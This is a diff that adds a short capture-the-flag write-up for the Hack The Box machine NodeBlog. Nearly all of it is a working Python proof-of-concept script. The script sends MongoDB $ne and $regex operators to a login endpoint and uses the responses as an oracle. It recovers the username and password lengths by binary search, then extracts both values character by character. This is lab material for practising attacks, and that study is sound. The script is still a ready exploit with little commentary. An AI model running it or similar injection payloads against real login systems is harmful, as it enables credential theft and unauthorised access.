@@ -1,0 +1,87 @@
+---
+title: NodeBlog
+description: Exploiting NoSQL injection to extract datas
+---
+
+>Link: https://app.hackthebox.com/machines/NodeBlog
+
+For this box, we are only demonstrating a proof of concept (POC) for NoSQL injection-based data extraction.
+
+### POC
+```python
+#!/usr/bin/env python3
+import re
+import json
+import requests
+import string
+
+CHARSET      = string.ascii_letters + string.digits + "{}_-!@#$%^&*"
+URL          = "http://X.X.X.X:5000"
+proxies      = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}
+headers      = {"Content-Type": "application/json"}
+
+session = requests.Session()
+session.proxies.update(proxies)
+session.headers.update(headers)
+
+username = ""
+
+def oracle(pattern, target="password"):
+    if target != "password":
+        payload = {
+            "password": {"$ne": "bar"},
+            "user": {"$regex": f"^{pattern}$"}
+        }
+    else:
+        payload = {
+            "user": username,
+            "password": {"$regex": f"^{pattern}$"}
+        }
+    r = session.post(URL + "/login", data=json.dumps(payload))
+    return "Upload" in r.text
+
+
+def get_length(target="password", max_len=100):
+    lo, hi = 1, max_len
+    while lo < hi:
+        mid = (lo + hi) // 2
+        if oracle(f".{{1,{mid}}}", target=target):
+            hi = mid
+        else:
+            lo = mid + 1
+    return lo
+
+
+def extract(length, target="password"):
+    known = ""
+    for pos in range(length):
+        for c in CHARSET:
+            safe    = re.escape(c)          # replaces the manual replace chain
+            pattern = known + safe + f".{{{length - pos - 1}}}"
+            if oracle(pattern, target=target):
+                known += c
+                print(f"\r[+] {known}", end="", flush=True)
+                break
+        else:
+            print(f"\n[!] Unknown char at pos {pos}, using wildcard")
+            known += "."
+    return known
+
+if __name__ == "__main__":
+    print("[*] Finding username length...")
+    ulen = get_length(target="user")
+    print(f"[+] Username length: {ulen}")
+
+    print("[*] Extracting username...")
+    username = extract(ulen, target="user")
+    print(f"\n[+] Username: {username}")
+
+    print("[*] Finding password length...")
+    pass_len = get_length(target="password")
+    print(f"[+] Password length: {pass_len}")
+
+    print("[*] Extracting password...")
+    result = extract(pass_len, target="password")
+    print(f"\n[+] Password: {result}")
+
+```
